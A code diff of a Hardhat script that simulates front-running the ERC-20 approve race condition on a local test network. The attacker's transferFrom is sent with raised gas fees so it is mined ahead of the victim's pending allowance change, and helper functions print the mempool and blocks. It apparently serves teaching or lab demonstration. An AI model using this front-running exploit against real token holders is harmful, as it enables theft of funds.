@@ -25,18 +25,12 @@ async function main() {
     const expectedAttackerBalance = ethers.parseUnits("300", 18); // 0 + 100 + 200 = 300
 
     // Owner transfers 300 tokens to the victim
-    console.log("===== Step 1: Owner Transfers Tokens to Victim =====");
     const transferTx = await ctuToken.transfer(victim.address, transferAmount);
     const transferReceipt = await transferTx.wait();
-    logTransactionDetails("Owner -> Victim Transfer", transferTx, transferReceipt);
-    console.log(`Owner transferred ${ethers.formatUnits(transferAmount, 18)} CTU to Victim.\n`);
 
     // Victim approves attacker to spend 100 tokens
-    console.log("===== Step 2: Victim Approves Attacker =====");
     const approveTx = await ctuToken.connect(victim).approve(attacker.address, approvalAmount);
     const approveReceipt = await approveTx.wait();
-    logTransactionDetails("Victim Approves Attacker", approveTx, approveReceipt);
-    console.log(`Victim approved Attacker to spend ${ethers.formatUnits(approvalAmount, 18)} CTU.\n`);
 
     // Display Initial State
     console.log("===== Initial State =====");
@@ -44,49 +38,47 @@ async function main() {
     console.log("========================\n");
 
     // Step 3: Victim initiates approval to increase to 200 tokens
-    console.log("===== Step 3: Victim Initiates Approval to Increase =====");
-    console.log("Victim is sending a transaction to approve 200 CTU for the attacker.\n");
-    
-    // Note: The approval transaction is initiated below in Step 5
-    // Simulate pending approval by delaying the approval transaction
-    // However, in this sequential script, transactions are mined immediately
-    // To simulate, we proceed directly to the attack
-
-    // Step 4: Attacker detects the pending approval and front-runs
-    console.log("===== Step 4: Attacker Exploits Race Condition =====");
-    console.log("Attacker detects the pending approval and uses the existing allowance of 100 CTU to transfer tokens.");
-    console.log("Attacker is frontrunning the blockchain to exploit the race condition.");
-    // Attacker sends transferFrom using the old allowance
-    const txAttacker1 = await ctuToken.connect(attacker).transferFrom(victim.address, attacker.address, approvalAmount);
-    const txAttacker1Receipt = await txAttacker1.wait();
-    logTransactionDetails("Attacker TransferFrom (Initial Allowance)", txAttacker1, txAttacker1Receipt);
-    console.log("Attacker transferred 100 CTU using the initial allowance.\n");
-
-    // Display State After Attacker's First Transfer
-    console.log("===== State After Attacker's First Transfer =====");
-    await displayState(ctuToken, victim, attacker);
-    console.log("==================================================\n");
-
-    // Step 5: Victim's approval to increase is mined
-    console.log("===== Step 5: Victim's Approval to 200 CTU Mined =====");
-    console.log("Victims transaction is finally mined after being frontrunned by the attacker transferFrom transaction.\n");
+    console.log("=== Step 1: Victim Initiates Approval to Increase Allowance");
+    console.log("=== Victim is sending a transaction to the mempool to approve 200 CTU for the attacker.\n");
     const approveTxIncreased = await ctuToken.connect(victim).approve(attacker.address, increasedApprovalAmount);
-    const approveIncreasedReceipt = await approveTxIncreased.wait();
-    logTransactionDetails("Victim Increases Approval", approveTxIncreased, approveIncreasedReceipt);
-    console.log("Victim has increased the approval to 200 CTU.");
+
+    // Print the state of the mempool
+    await printMempool();
+
+    console.log("=== Step 2: Attacker detects the pending approval and uses the existing allowance of 100 CTU to transfer tokens.");
+    console.log("=== Attacker is frontrunning the transaction by setting higher fees.");
+
+    // Increase maxFeePerGas and maxPriorityFeePerGas by 10 gwei
+    const gasEstimate = await ethers.provider.getFeeData();
+    const increasedMaxFeePerGas = gasEstimate.maxFeePerGas + (ethers.parseUnits('10', 'gwei'));
+    const increasedMaxPriorityFeePerGas = gasEstimate.maxPriorityFeePerGas + (ethers.parseUnits('10', 'gwei'));
+
+    // Attacker sends transferFrom using the old allowance, he is frontrunning the transaction, he sets the fees higher
+    const txAttacker1 = await ctuToken.connect(attacker).transferFrom(victim.address, attacker.address, approvalAmount, {
+        maxFeePerGas: increasedMaxFeePerGas,
+        maxPriorityFeePerGas: increasedMaxPriorityFeePerGas,
+    });
+
+    await printMempool();
+
+    // Wait until both transactions are mined
+    await approveTxIncreased.wait();
+    await txAttacker1.wait();
+
+    console.log("Attacker transferred 100 CTU using the initial allowance.\n");
+    console.log("Victims transaction is mined after being frontrunned by the attacker transferFrom transaction.\n");
 
     // Display State After Victim's Approval
     console.log("===== State After Victim's Approval =====");
     await displayState(ctuToken, victim, attacker);
     console.log("==========================================\n");
 
-    // Step 6: Attacker uses the increased approval to transfer more tokens
-    console.log("===== Step 6: Attacker Utilizes Increased Approval =====");
-    console.log("Attacker transfers an additional 200 CTU using the increased allowance.");
-    const txAttacker2 = await ctuToken.connect(attacker).transferFrom(victim.address, attacker.address, increasedApprovalAmount);
-    const txAttacker2Receipt = await txAttacker2.wait();
-    logTransactionDetails("Attacker TransferFrom (Increased Allowance)", txAttacker2, txAttacker2Receipt);
-    console.log("Attacker transferred 200 CTU using the increased allowance.\n");
+    console.log("=== Step 3: Attacker Utilizes Increased Approval");
+    console.log("=== Attacker transfers an additional 200 CTU using the increased allowance.");
+    // Transfer the remaining 200 tokens using the increased approval
+    const txAttacker2 = await ctuToken.connect(attacker).transferFrom(victim.address, attacker.address, increasedApprovalAmount)
+    // Wait until the transaction is mined
+    await txAttacker2.wait();
 
     // Display Final State
     console.log("===== Final State =====");
@@ -100,8 +92,8 @@ async function main() {
 
     // Check if the attack was successful
     const isAttackSuccessful = finalVictimBalance == expectedVictimBalance &&
-                                finalAttackerBalance == expectedAttackerBalance &&
-                                finalAllowance == 0;
+        finalAttackerBalance == expectedAttackerBalance &&
+        finalAllowance == 0;
 
     if (isAttackSuccessful) {
         console.log("===== Attack Successful =====");
@@ -131,6 +123,9 @@ async function main() {
     }
 
     console.log("===== Attack Simulation Completed =====");
+
+    // Uncomment to print all the information about the mined blocks
+    // await printAllBlocksInfo();
 }
 
 // Helper function to display current state
@@ -138,14 +133,9 @@ async function displayState(ctuToken, victim, attacker) {
     const victimBalance = ethers.formatUnits(await ctuToken.balanceOf(victim.address), 18);
     const attackerBalance = ethers.formatUnits(await ctuToken.balanceOf(attacker.address), 18);
     const allowance = ethers.formatUnits(await ctuToken.allowance(victim.address, attacker.address), 18);
-    const totalSupply = ethers.formatUnits(await ctuToken.totalSupply(), 18);
-
-    console.log("----- Current State -----");
-    console.log(`Total Supply:                ${totalSupply} CTU`);
     console.log(`Victim Balance:             ${victimBalance} CTU`);
     console.log(`Attacker Balance:           ${attackerBalance} CTU`);
     console.log(`Allowance (Victim->Attacker): ${allowance} CTU`);
-    console.log("-------------------------\n");
 }
 
 // Helper function to log transaction details
@@ -153,6 +143,7 @@ function logTransactionDetails(title, tx, receipt) {
     console.log(`===== ${title} =====`);
     console.log(`Transaction Hash: ${tx.hash}`);
     console.log(`Block Number:     ${receipt.blockNumber}`);
+    console.log(`Block Hash:       ${receipt.blockHash}`);
     console.log(`Gas Used:         ${receipt.gasUsed.toString()}`);
     console.log(`Status:           ${receipt.status === 1 ? "Success" : "Failed"}`);
     if (receipt.events && receipt.events.length > 0) {
@@ -164,6 +155,95 @@ function logTransactionDetails(title, tx, receipt) {
     }
     console.log("========================\n");
 }
+
+// Helper function to print pending transactions
+async function printMempool() {
+    const pendingBlock = await network.provider.send("eth_getBlockByNumber", [
+        "pending",
+        false,
+    ]);
+    for (const tx of pendingBlock.transactions) {
+        const txData = await network.provider.send("eth_getTransactionByHash", [tx]);
+        console.log(`Transaction Hash: ${txData.hash}`);
+        console.log(`From:             ${txData.from}`);
+        console.log(`To:               ${txData.to}`);
+        console.log(`Value:            ${ethers.formatUnits(txData.value, "ether")} ETH`);
+        console.log(`Gas Price:        ${ethers.formatUnits(txData.gasPrice, "gwei")} GWEI`);
+        console.log(`Gas:              ${Number(txData.gas)}`);
+        console.log(`Input:            ${txData.input}`);
+        console.log(`Max Fee Per Gas:  ${ethers.formatUnits(txData.maxFeePerGas, "gwei")} GWEI`);
+        console.log(`Max Priority Fee: ${ethers.formatUnits(txData.maxPriorityFeePerGas, "gwei")} GWEI`);
+        // console.log(`Transaction Object: ${JSON.stringify(txData, null, 2)}`);
+        console.log("------------------------------------------\n");
+    }
+}
+
+// Helper function to print the information about the last block
+async function printLastBlockInfo() {
+    const lastBlock =  await hre.ethers.provider.getBlock("latest");
+    console.log("===== Block Mined =====");
+    console.log(`Block Number:     ${lastBlock.number}`);
+    console.log(`Block Hash:       ${lastBlock.hash}`);
+    console.log(`Parent Hash:      ${lastBlock.parentHash}`);
+    console.log(`Timestamp:        ${new Date(lastBlock.timestamp * 1000).toLocaleString()}`);
+    console.log(`Transactions:     ${lastBlock.transactions.length}`);
+    console.log(`Validator:        ${lastBlock.miner}`); // Changed from Miner to Validator
+    console.log(`Gas Limit:        ${ethers.formatUnits(lastBlock.gasLimit, "gwei")} GWEI`);
+    console.log(`Gas Used:         ${ethers.formatUnits(lastBlock.gasUsed, "gwei")} GWEI`);
+    console.log(`Base Fee Per Gas: ${ethers.formatUnits(lastBlock.baseFeePerGas, "gwei")} GWEI`);
+    console.log("==================================\n");
+
+    // Print transactions, their hashes, and order
+    console.log("===== Transactions in Last Block =====");
+    const transactions = await Promise.all(lastBlock.transactions.map(txHash => ethers.provider.getTransaction(txHash)));
+    transactions.sort((a, b) => a.nonce - b.nonce);
+    for (const tx of transactions) {
+        console.log(`Nonce: ${tx.nonce}, Transaction Hash: ${tx.hash}`);
+    }
+    
+    console.log("======================================\n");
+}
+
+// Helper function to print information about all blocks
+async function printAllBlocksInfo() {
+    const latestBlockNumber = await hre.ethers.provider.getBlockNumber();  // Get the latest block number
+    console.log(`Printing all blocks starting from block 0 to block ${latestBlockNumber}...\n`);
+
+    // Loop through each block and print its details
+    for (let blockNumber = 0; blockNumber <= latestBlockNumber; blockNumber++) {
+        const block = await hre.ethers.provider.getBlock(blockNumber);
+        console.log("===== Block Information =====");
+        console.log(`Block Number:     ${block.number}`);
+        console.log(`Block Hash:       ${block.hash}`);
+        console.log(`Parent Hash:      ${block.parentHash}`);
+        console.log(`Timestamp:        ${new Date(block.timestamp * 1000).toLocaleString()}`);
+        console.log(`Transactions:     ${block.transactions.length}`);
+        console.log(`Validator:        ${block.miner || block.validator}`);  // Use 'miner' or 'validator' depending on the network
+        console.log(`Gas Limit:        ${ethers.formatUnits(block.gasLimit, "gwei")} GWEI`);
+        console.log(`Gas Used:         ${ethers.formatUnits(block.gasUsed, "gwei")} GWEI`);
+        console.log(`Base Fee Per Gas: ${ethers.formatUnits(block.baseFeePerGas || 0, "gwei")} GWEI`);
+        console.log("==============================\n");
+
+        // If the block has transactions, print them
+        if (block.transactions.length > 0) {
+            console.log("===== Transactions in Block =====");
+            // Fetch and display transaction details
+            const transactions = await Promise.all(block.transactions.map(txHash => hre.ethers.provider.getTransaction(txHash)));
+            transactions.sort((a, b) => a.nonce - b.nonce); // Sort by nonce
+            for (const tx of transactions) {
+                console.log(`Nonce: ${tx.nonce}, Transaction Hash: ${tx.hash}`);
+                console.log(`From: ${tx.from}`);
+                console.log(`To: ${tx.to}`);
+                console.log(`Value: ${ethers.formatUnits(tx.value, "ether")} ETH`);
+                console.log(`Gas Price: ${ethers.formatUnits(tx.gasPrice, "gwei")} GWEI`);
+                console.log("-------------------------------");
+            }
+            console.log("================================\n");
+        }
+    }
+    console.log("===== Block Printing Completed =====");
+}
+
 
 main()
     .then(() => process.exit(0))
